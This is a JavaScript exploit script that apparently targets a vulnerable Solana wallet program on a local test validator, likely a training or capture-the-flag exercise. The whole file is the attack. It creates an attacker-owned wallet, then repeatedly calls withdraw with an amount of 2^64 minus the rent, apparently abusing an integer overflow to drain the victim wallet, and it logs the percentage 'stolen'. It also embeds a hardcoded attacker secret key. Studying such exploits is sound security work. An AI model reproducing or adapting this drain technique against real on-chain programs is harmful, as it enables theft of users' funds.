const {
  Keypair,
  Transaction,
  LAMPORTS_PER_SOL,
  Connection,
  sendAndConfirmTransaction,
  PublicKey,
  SystemProgram,
} = require("@solana/web3.js");

const bs58 = require("bs58");
const fs = require("fs");

const { Wallet } = require("wallet-v1");

const authorityPublicKey = new PublicKey(
  bs58.decode("7By5EKRWGRKD5eQSh582u3QPcyuYRi7Me5UHzJ4hvru4")
);
const walletProgramId = new PublicKey(
  bs58.decode("13EYLEkRj1XgDpNxeKyDTRH3Rtn8xyQ5Qu8yXCjeDHhh")
);

console.log(`[*] Authority: ${authorityPublicKey}`);
console.log(`[*] Wallet: ${walletProgramId}`);

const connection = new Connection("http://localhost:8899", "confirmed");

// initialize attacker's keys
let attackerSecretKey = Uint8Array.from([
  61, 234, 218, 250, 91, 105, 201, 10, 169, 51, 137, 21, 23, 228, 162, 2, 4, 48,
  158, 95, 41, 153, 14, 78, 38, 72, 140, 218, 108, 69, 149, 213, 91, 248, 110,
  163, 191, 97, 101, 129, 245, 158, 22, 200, 191, 11, 23, 166, 6, 179, 225, 153,
  169, 233, 223, 178, 24, 145, 185, 167, 217, 137, 141, 54,
]);
let attacker = Keypair.fromSecretKey(attackerSecretKey);

(async () => {
  // receive 'tiny' airdrop
  {
    const sig = await connection.requestAirdrop(
      attacker.publicKey,
      1.0 * LAMPORTS_PER_SOL
    );
    await connection.confirmTransaction({ signature: sig });
  }

  const balancePrev = await connection.getBalance(attacker.publicKey);
  console.log(
    `[*] Previous balance of attacker: ${balancePrev / LAMPORTS_PER_SOL} SOL`
  );

  const [walletAddress, _walletBumpSeed] = PublicKey.findProgramAddressSync(
    [authorityPublicKey.toBytes()],
    walletProgramId
  );

  {
    // initialize another wallet whose authority is attacker
    const [ix1, attackerWalletAddress] = Wallet.initialize(
      walletProgramId,
      attacker.publicKey
    );
    let tx1 = new Transaction().add(ix1);
    await sendAndConfirmTransaction(connection, tx1, [attacker]);
    console.log(
      `[+] Created a new wallet whose authority is attacker: ${attackerWalletAddress}`
    );

    const withdrawAmount = await connection.getBalance(walletAddress);
    console.log(
      `[*] Amount of funds to steal: ${withdrawAmount / LAMPORTS_PER_SOL} SOL`
    );

    // by using that wallet, drain funds using - amount
    const walletRent = await connection.getMinimumBalanceForRentExemption(32);
    for (var i = 0; i < withdrawAmount / walletRent; i++) {
      let amtArg = (1n << 64n) - BigInt(walletRent);
      const ix3 = Wallet.withdraw(
        walletProgramId,
        attackerWalletAddress,
        attacker.publicKey,
        walletAddress,
        amtArg
      );
      let tx3 = new Transaction().add(ix3);
      await sendAndConfirmTransaction(connection, tx3, [attacker]);
      console.log(
        `[+] Attacker stole ${(
          ((walletRent * i) / withdrawAmount) *
          100
        ).toFixed(3)}% of wallet TVL`
      );
    }
  }

  const balanceFinal = await connection.getBalance(attacker.publicKey);
  console.log(
    `[*] Final balance of attacker: ${balanceFinal / LAMPORTS_PER_SOL} SOL`
  );
})();
